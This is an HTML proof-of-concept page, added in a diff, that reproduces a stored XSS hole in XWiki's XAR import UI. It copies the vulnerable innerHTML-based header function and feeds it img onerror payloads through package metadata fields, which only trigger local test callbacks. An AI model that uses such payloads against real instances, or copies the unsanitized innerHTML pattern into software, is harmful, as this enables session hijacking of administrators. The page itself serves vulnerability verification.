@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>GHSA-36fm-j33w-c25f — XSS in XAR Import Package Header</title>
+  <style>
+    body { font-family: monospace; margin: 2em; background: #1e1e1e; color: #ccc; }
+    h1 { color: #e44; }
+    .test { margin: 1em 0; padding: 1em; border: 1px solid #444; background: #2a2a2a; }
+    .pass { border-left: 4px solid #4a4; }
+    .fail { border-left: 4px solid #a44; }
+    .label { color: #888; }
+    #results { margin-top: 2em; font-size: 1.1em; }
+    code { background: #333; padding: 2px 6px; }
+  </style>
+</head>
+<body>
+<h1>GHSA-36fm-j33w-c25f — XSS Reproduction</h1>
+<p>
+  This page reproduces the stored XSS vulnerability in XWiki's XAR import UI.
+  The <code>createPackageHeader</code> function in <code>import.js</code> uses
+  Prototype.js's <code>.update()</code> (which sets innerHTML) to render
+  unsanitized XAR package metadata fields (name, version, author, licence, filename).
+</p>
+<p>
+  An attacker crafts a malicious XAR file with HTML/JS payloads in metadata fields.
+  When an admin imports the package, the payloads execute in the admin's browser session.
+</p>
+
+<hr>
+<h2>Simulated Package Container</h2>
+<div id="packagecontainer"></div>
+
+<div id="results"></div>
+
+<!-- Minimal Prototype.js shim: only Element and .update() / .insert() needed -->
+<script>
+// Minimal Prototype.js-compatible shim for Element creation and .update()/.insert()
+var Element = function(tag, attrs) {
+  var el = document.createElement(tag);
+  if (attrs) {
+    for (var k in attrs) {
+      if (k === 'class') el.className = attrs[k];
+      else el.setAttribute(k, attrs[k]);
+    }
+  }
+  // Prototype's .update() sets innerHTML
+  el.update = function(content) {
+    if (typeof content === 'string') {
+      el.innerHTML = content;            // <-- THE VULNERABILITY: innerHTML
+    } else if (content && content.nodeType) {
+      el.innerHTML = '';
+      el.appendChild(content);
+    }
+    return el;
+  };
+  // Prototype's .insert() appends content
+  el.insert = function(content) {
+    if (typeof content === 'string') {
+      el.insertAdjacentHTML('beforeend', content);
+    } else if (content && content.nodeType) {
+      el.appendChild(content);
+    }
+    return el;
+  };
+  return el;
+};
+
+// ---------------------------------------------------------------
+// Vulnerable createPackageHeader — exact copy from import.js
+// before the fix (commit cdc18aedf88)
+// ---------------------------------------------------------------
+function createPackageHeader_VULNERABLE(name, infos) {
+    var translations = {
+        "package": "Package",
+        "description": "Description",
+        "version": "Version",
+        "author": "Author",
+        "licence": "Licence"
+    };
+
+    var packageInfos = new Element("div", {'class':'packageinfos'});
+    packageInfos.insert(  new Element("div")
+             .insert( new Element("span", {'class':'label'}).update(translations["package"]) )
+             .insert( new Element("span", {'class':'filename'}).update(name) )  );
+    if( infos.name !== "") {
+      packageInfos.insert(  new Element("div")
+                              .insert( new Element("span", {'class':'label'}).update(translations["description"]) )
+                              .insert( new Element("span", {'class':'name'}).update(infos.name) )  );
+    }
+    if (infos.version !== "") {
+      packageInfos.insert(  new Element("div")
+                              .insert( new Element("span", {'class':'label'}).update(translations["version"]) )
+                              .insert( new Element("span", {'class':'version'}).update(infos.version) )  );
+    }
+    if (infos.author !== "") {
+      packageInfos.insert(  new Element("div")
+                              .insert( new Element("span", {'class':'label'}).update(translations["author"]) )
+                              .insert( new Element("span", {'class':'author'}).update(infos.author) )  );
+    }
+    if (infos.licence !== "") {
+      packageInfos.insert(  new Element("div")
+                              .insert( new Element("span", {'class':'label'}).update(translations["licence"]) )
+                              .insert( new Element("span", {'class':'licence'}).update(infos.licence) )  );
+    }
+    return packageInfos;
+}
+
+// ---------------------------------------------------------------
+// Test: inject XSS payloads via package metadata fields
+// ---------------------------------------------------------------
+var xssTriggered = {};
+
+// Global callbacks that XSS payloads will invoke
+window.xssName    = function() { xssTriggered.name    = true; };
+window.xssVersion = function() { xssTriggered.version = true; };
+window.xssAuthor  = function() { xssTriggered.author  = true; };
+window.xssLicence = function() { xssTriggered.licence = true; };
+window.xssFilename = function() { xssTriggered.filename = true; };
+
+// Simulated malicious XAR metadata — an attacker puts these in package.xml
+var maliciousInfos = {
+    name:    '<img src=x onerror="xssName()"><b id="xss-name">XSS-NAME</b>',
+    version: '<img src=x onerror="xssVersion()"><b id="xss-version">XSS-VERSION</b>',
+    author:  '<img src=x onerror="xssAuthor()"><b id="xss-author">XSS-AUTHOR</b>',
+    licence: '<img src=x onerror="xssLicence()"><b id="xss-licence">XSS-LICENCE</b>',
+    backup: false
+};
+
+var maliciousFilename = '<img src=x onerror="xssFilename()"><b id="xss-filename">XSS-FILENAME</b>';
+
+// Render the vulnerable package header
+var container = document.getElementById('packagecontainer');
+var header = createPackageHeader_VULNERABLE(maliciousFilename, maliciousInfos);
+container.appendChild(header);
+
+// Wait a tick for onerror handlers to fire, then check results
+setTimeout(function() {
+    var results = document.getElementById('results');
+    var fields = ['filename', 'name', 'version', 'author', 'licence'];
+    var allPassed = true;
+
+    results.innerHTML = '<h2>Test Results</h2>';
+
+    fields.forEach(function(field) {
+        var fired = !!xssTriggered[field];
+        var domInjected = !!document.getElementById('xss-' + field);
+        var passed = fired && domInjected;
+        if (!passed) allPassed = false;
+
+        var div = document.createElement('div');
+        div.className = 'test ' + (passed ? 'pass' : 'fail');
+        div.innerHTML =
+            '<strong>' + field.toUpperCase() + '</strong>: ' +
+            'JS executed = <code>' + fired + '</code>, ' +
+            'DOM injected = <code>' + domInjected + '</code> — ' +
+            (passed
+                ? '<span style="color:#4a4">VULNERABLE (XSS confirmed)</span>'
+                : '<span style="color:#a44">NOT triggered</span>');
+        results.appendChild(div);
+    });
+
+    var summary = document.createElement('div');
+    summary.className = 'test ' + (allPassed ? 'fail' : 'pass');
+    summary.innerHTML = allPassed
+        ? '<strong style="color:#e44">ALL 5 FIELDS VULNERABLE TO XSS</strong> — ' +
+          'Prototype.js .update() renders attacker-controlled HTML as innerHTML.'
+        : '<strong>Some fields did not trigger.</strong>';
+    results.appendChild(summary);
+
+    // Output for automated checking
+    console.log('XSS_RESULTS=' + JSON.stringify(xssTriggered));
+    console.log('ALL_VULNERABLE=' + allPassed);
+}, 200);
+</script>
+</body>
+</html>
